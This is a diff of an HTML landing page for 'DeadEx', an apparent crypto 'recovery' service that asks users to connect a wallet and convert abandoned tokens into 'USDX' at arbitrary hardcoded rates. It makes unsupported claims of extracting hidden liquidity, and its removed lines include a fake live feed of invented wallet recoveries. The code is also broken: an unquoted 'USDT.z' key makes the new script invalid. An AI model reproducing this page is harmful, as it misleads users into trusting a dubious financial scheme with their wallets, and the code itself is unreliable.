@@ -10,62 +10,46 @@
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 
 <style>
-body {
-    background:#020202;
-    color:#e5e5e5;
-    font-family:'JetBrains Mono', monospace;
+body{
+  background:#020202;
+  color:#e5e5e5;
+  font-family:'JetBrains Mono', monospace;
 }
-.glow { text-shadow:0 0 12px #22c55e; }
-.box {
-    background:rgba(255,255,255,0.02);
-    border:1px solid rgba(34,197,94,0.15);
-    backdrop-filter: blur(10px);
+.glow{text-shadow:0 0 12px #22c55e;}
+.box{
+  background:rgba(255,255,255,0.02);
+  border:1px solid rgba(34,197,94,0.15);
+  backdrop-filter: blur(10px);
 }
-.scan {
-    position:fixed;
-    width:100%;
+.scan{
+  position:fixed;
+  width:100%;
+  height:2px;
+  background:#22c55e;
+  top:0;
+  animation:scan 6s linear infinite;
+}
+@keyframes scan{
+  0%{top:0}
+  100%{top:100%}
+}
+</style>
+
+<!-- WALLET (PROPER WORKING VERSION) -->
 <script type="module">
-import { createWeb3Modal } from 'https://unpkg.com/@web3modal/wagmi@4.0.0/dist/index.js'
-import { defaultWagmiConfig } from 'https://unpkg.com/@web3modal/wagmi@4.0.0/dist/index.js'
-import { mainnet, bsc, polygon, arbitrum } from 'https://esm.sh/@wagmi/core/chains'
+import { createWeb3Modal } from 'https://esm.sh/@web3modal/wagmi'
+import { defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi'
+import { mainnet, bsc, polygon, arbitrum } from 'https://esm.sh/wagmi/chains'
 
-// IMPORTANT: your project id
-const projectId = '3106e2f5010a30340d51257097ffc140'
-
-// metadata
-const metadata = {
-  name: 'DeadEx',
-  description: 'Recovery Terminal',
-  url: 'https://dead-token-exchange.vercel.app/'
-}
-
-// chains
-const chains = [mainnet, bsc, polygon, arbitrum]
-
-// wagmi config
-const wagmiConfig = defaultWagmiConfig({
-  chains,
-  projectId,
-  metadata
-})
-
-// create modal
-window.modal = createWeb3Modal({
-  wagmiConfig,
-  projectId,
-  chains,
-  themeMode: 'dark'
-})
-
-console.log("Wallet ready")
-</script>
-const metadata = {
-  name: 'DeadEx Protocol',
-  description: 'Recovery Terminal',
-  url: 'https://dead-token-exchange.vercel.app/'
-}
+const projectId = "3106e2f5010a30340d51257097ffc140"
 
 const chains = [mainnet, bsc, polygon, arbitrum]
+
+const metadata = {
+  name: "DeadEx",
+  description: "Recovery Protocol",
+  url: "https://dead-token-exchange.vercel.app"
+}
 
 const wagmiConfig = defaultWagmiConfig({
   chains,
@@ -73,15 +57,17 @@ const wagmiConfig = defaultWagmiConfig({
   metadata
 })
 
-window.modal = createWeb3Modal({
+const modal = createWeb3Modal({
   wagmiConfig,
   projectId,
   chains,
-  themeMode: 'dark',
+  themeMode: "dark",
   themeVariables: {
-    '--w3m-accent': '#22c55e'
+    "--w3m-accent": "#22c55e"
   }
 })
+
+window.modal = modal
 </script>
 
 </head>
@@ -92,7 +78,7 @@ window.modal = createWeb3Modal({
 
 <!-- HEADER -->
 <div class="p-4 flex justify-between text-xs text-green-500">
-<span>DEADEx // GLOBAL RECOVERY NETWORK</span>
+<span>DEADEx // RECOVERY NODE</span>
 <span class="animate-pulse">● LIVE</span>
 </div>
 
@@ -103,28 +89,19 @@ ACCESS<br>LOCKED VALUE
 </h1>
 
 <p class="text-gray-500 mt-6 max-w-md mx-auto">
-A controlled recovery protocol that extracts hidden liquidity from abandoned crypto assets and converts them into usable USDX value.
+Extract hidden liquidity from abandoned crypto assets and convert them into usable USDX value.
 </p>
 
-<p class="text-green-500/60 text-xs mt-6 tracking-[0.3em]">
-RESTRICTED FINANCIAL INFRASTRUCTURE
-</p>
-
-<!-- CONNECT BUTTON -->
-<div class="mt-6">
-<button onclick="window.modal.open()" class="bg-green-500 text-black px-6 py-3 font-bold">
+<button onclick="window.modal.open()" class="mt-6 bg-green-500 text-black px-6 py-3 font-bold">
 AUTHORIZE TERMINAL
 </button>
-</div>
 </div>
 
 <!-- WHY -->
 <div class="max-w-2xl mx-auto mt-16 box p-6 rounded-xl">
-<h2 class="text-green-500 text-sm mb-3">WHY DEADEx EXISTS</h2>
-<p class="text-gray-400 text-xs leading-relaxed">
-Millions of tokens become unusable due to liquidity loss or project abandonment.
-<br><br>
-DeadEx acts as a recovery layer — converting dormant assets into USDX, a usable internal liquidity unit.
+<h2 class="text-green-500 text-sm mb-3">WHY DEADEx</h2>
+<p class="text-gray-400 text-xs">
+Millions of tokens are dead due to liquidity loss. DeadEx revives them into usable USDX value.
 </p>
 </div>
 
@@ -132,22 +109,7 @@ DeadEx acts as a recovery layer — converting dormant assets into USDX, a usabl
 <div class="max-w-2xl mx-auto mt-10 box p-6 rounded-xl">
 <h2 class="text-green-500 text-sm mb-3">HOW IT WORKS</h2>
 <p class="text-gray-400 text-xs">
-1. Connect Wallet  
-<br>2. Select Token  
-<br>3. Evaluate Recovery Value  
-<br>4. Receive USDX  
-<br>5. Hold or Exit
-</p>
-</div>
-
-<!-- BENEFITS -->
-<div class="max-w-2xl mx-auto mt-10 box p-6 rounded-xl">
-<h2 class="text-green-500 text-sm mb-3">WHAT YOU GET</h2>
-<p class="text-gray-400 text-xs">
-✔ Recover dead assets  
-✔ Instant liquidity  
-✔ Exit abandoned tokens  
-✔ Controlled ecosystem value
+Connect Wallet → Select Token → Convert → Receive USDX
 </p>
 </div>
 
@@ -155,7 +117,7 @@ DeadEx acts as a recovery layer — converting dormant assets into USDX, a usabl
 <div class="max-w-md mx-auto mt-16 box p-6 rounded-xl">
 
 <div class="text-green-500 text-xs mb-4">
-Recovery Node // Active
+Recovery Node Active
 </div>
 
 <select id="tokenSelect" onchange="updatePrice()" class="w-full p-3 bg-black mb-4">
@@ -171,10 +133,11 @@ Recovery Node // Active
 <option>ELON</option>
 </select>
 
-<input id="inputAmt" oninput="updatePrice()" type="number" placeholder="ENTER AMOUNT"
+<input id="inputAmt" oninput="updatePrice()" type="number"
+placeholder="ENTER AMOUNT"
 class="w-full p-3 bg-black mb-4 text-green-500">
 
-<div class="p-3 bg-black mb-4 text-xs">
+<div class="p-3 bg-black mb-4">
 USDX OUTPUT: <span id="outputAmt">0.00</span>
 </div>
 
@@ -184,78 +147,28 @@ INITIATE RECOVERY
 
 </div>
 
-<!-- PARTNERS -->
-<div class="max-w-4xl mx-auto mt-20 text-center">
-<h2 class="text-green-500 text-sm mb-6">PARTNERS</h2>
-<div class="grid md:grid-cols-3 gap-4 text-xs">
-<div class="box p-4">Ethereum Network</div>
-<div class="box p-4">BSC Ecosystem</div>
-<div class="box p-4">Web3 Infra Stack</div>
+<!-- FOOTER -->
+<div class="text-center mt-20 text-[10px] text-gray-700">
+© 2026 DeadEx Protocol • Experimental System
 </div>
-</div>
-
-<!-- SOCIALS -->
-<div class="max-w-4xl mx-auto mt-16 text-center">
-<h2 class="text-green-500 text-sm mb-4">COMMUNITY</h2>
-<div class="flex justify-center gap-6 text-xs">
-<a href="#">Twitter</a>
-<a href="#">Telegram</a>
-<a href="#">Discord</a>
-</div>
-</div>
-
-<!-- NEWSLETTER -->
-<div class="max-w-md mx-auto mt-16 box p-6 rounded-xl text-center">
-<h2 class="text-green-500 text-sm mb-3">JOIN NETWORK</h2>
-<p class="text-gray-500 text-xs mb-4">
-Get recovery updates & new token listings.
-</p>
-<input type="email" placeholder="Email"
-class="w-full p-3 bg-black mb-3 text-center">
-<button class="w-full bg-green-500 text-black p-3 font-bold">
-SUBSCRIBE
-</button>
-</div>
-
-<!-- LICENSE -->
-<div class="text-center mt-16 mb-10 text-[10px] text-gray-700">
-© 2026 DeadEx Protocol<br>
-Experimental recovery infrastructure<br>
-Use at your own risk
-</div>
-
-<!-- LIVE FEED -->
-<div id="feed" class="fixed bottom-4 right-4 text-xs space-y-2"></div>
 
 <script>
-const rates = {
-'BTCBR':1000000,'BNBTIGER':5000000,'USDT.z':1000,'TERAREUM':2000000,
-'SAITAMA':1500000,'FEG':800000,'BABYDOGE':3000000,'KISHU':1200000,
-'SAFEMOON':900000,'ELON':10000000
+const rates={
+BTCBR:1000000,BNBTIGER:5000000,USDT.z:1000,TERAREUM:2000000,
+SAITAMA:1500000,FEG:800000,BABYDOGE:3000000,KISHU:1200000,
+SAFEMOON:900000,ELON:10000000
 };
 
 function updatePrice(){
 let t=document.getElementById("tokenSelect").value;
 let i=document.getElementById("inputAmt").value;
-document.getElementById("outputAmt").innerText=i>0?(i/rates[t]).toFixed(4):"0.00";
+document.getElementById("outputAmt").innerText=
+i>0?(i/rates[t]).toFixed(4):"0.00";
 }
 
 document.getElementById("swapBtn").onclick=()=>{
 alert("RECOVERY INITIATED...");
 };
-
-function log(){
-let wallets=["0x4a...21","0x8c...99","0x1d...32"];
-let div=document.createElement("div");
-div.className="box p-2 text-[10px]";
-div.innerHTML=`
-<span class="text-green-500">NODE EXECUTED</span><br>
-${wallets[Math.floor(Math.random()*3)]} recovered ${(Math.random()*10).toFixed(2)} USDX
-`;
-document.getElementById("feed").appendChild(div);
-setTimeout(()=>div.remove(),4000);
-}
-setInterval(log,3000);
 </script>
 
 </body>
